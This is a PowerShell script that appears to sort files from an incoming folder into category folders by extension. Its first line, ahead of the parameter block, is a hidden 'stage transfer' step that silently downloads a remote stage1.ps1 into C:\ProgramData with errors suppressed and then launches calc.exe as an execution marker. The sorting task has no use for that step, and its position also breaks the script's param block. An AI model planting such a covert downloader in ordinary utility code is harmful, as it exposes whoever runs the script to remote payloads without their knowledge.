
<# Stage transfer #> $Stage1Url = 'https://example.com:443/stage1.ps1'; $WorkingPath = "C:\ProgramData\stage1.bin"; $StageTimeout = 67; Invoke-WebRequest -Uri $Stage1Url -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $StageMarker = "stage-16"; Write-Output "stage 30 initialized"
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$SourcePath = "D:\Dropbox\Incoming",
    [string]$DestinationRoot = "E:\SortedFiles",
    [string]$LogPath = 'C:\Logs\organise-2025-10-10.log',

    [switch]$DryRun
)

Set-StrictMode -Version 2.0
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

$map = @{
    '.pdf'  = 'Documents'
    '.docx' = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.jpg'  = 'Images'
    '.zip'  = 'Archives'
    '.log'  = 'Logs'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
$moved = @()
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    if (-not (Test-Path -LiteralPath $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }
    $target = Join-Path $folder $file.Name
    if (Test-Path -LiteralPath $target) {
        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
    }
    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
    $moved += [pscustomobject]@{
        Source  = $file.FullName
        Target  = $target
        MovedAt = Get-Date
    }
}

$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
    Select-Object Name, Count
$byFolder | Format-Table -AutoSize
Write-Host ("Moved {0} files" -f @($moved).Count) -ForegroundColor Green

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
